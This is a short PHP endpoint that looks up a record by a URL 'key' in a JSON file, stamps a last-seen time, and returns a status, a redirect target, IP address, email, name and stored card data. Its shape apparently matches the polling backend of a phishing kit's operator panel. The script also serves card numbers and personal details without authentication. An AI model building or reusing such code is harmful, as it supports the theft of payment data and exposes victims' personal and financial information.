<?php
header('Content-Type: application/json');

$user_key = $_GET['key'] ?? '';
if (empty($user_key)) {
    echo json_encode(['error' => 'No key provided']);
    exit;
}

$db_file = 'data/users.db';
if (!file_exists($db_file)) {
    echo json_encode(['error' => 'Database not found']);
    exit;
}

$users = json_decode(file_get_contents($db_file), true) ?: [];

if (!isset($users[$user_key])) {
    echo json_encode(['error' => 'User not found']);
    exit;
}

// Update last_seen time
$users[$user_key]['last_seen'] = time();
file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));

// Return current status
$user = $users[$user_key];

echo json_encode([
    'status' => $user['status'] ?? 'unknown',
    'redirect' => $user['redirect_to'] ?? '',
    'ip' => $user['ip'] ?? '',
    'email' => $user['data']['email'] ?? '',
    'name' => $user['data']['name'] ?? '',
    'card' => $user['data']['card'] ?? ''
]);
?>
